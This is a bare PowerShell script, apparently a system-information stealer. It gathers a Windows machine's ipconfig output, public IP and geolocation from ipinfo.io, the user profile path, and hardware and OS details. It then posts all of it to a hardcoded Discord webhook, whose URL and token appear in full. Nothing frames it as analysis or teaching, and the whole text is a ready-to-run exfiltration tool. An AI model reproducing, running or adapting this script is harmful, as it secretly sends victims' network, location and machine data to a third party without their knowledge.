$webhook = "https://discord.com/api/webhooks/1421842960600797278/Hel1ZmXEJdFSH47KAfCGvoHyXlSnDJCrulfTRbaXdzX6om43vG1BKeQVoqBpMyNw6-l_"
$ipconfig1 = ipconfig | Out-String
$location1 = Invoke-RestMethod -Uri "https://www.ipinfo.io" | Out-String
$pcuser = "$env:userprofile" | Out-String
$info = Get-ComputerInfo | Select-Object CsName,OsName,OsVersion,OsArchitecture,WindowsProductName,WindowsVersion,WindowsBuildLabEx,OsInstallDate,OsLastBootUpTime,CsProcessor,CsTotalPhysicalMemory
$info | Format-List
$body1 = @{
            content = "'n:$location1''n:$ipconfig1"
          } | ConvertTo-Json
$body2 = @{
  content = "$pcuser"
} | ConvertTo-Json
$body3 = @{
  content = "$info"
} | ConvertTo-Json
Invoke-RestMethod -Uri $webhook -Method Post -Body $body1 -ContentType "application/json"
Invoke-RestMethod -Uri $webhook -Method Post -Body $body2 -ContentType "application/json"
Invoke-RestMethod -Uri $webhook -Method Post -Body $body3 -ContentType "application/json"
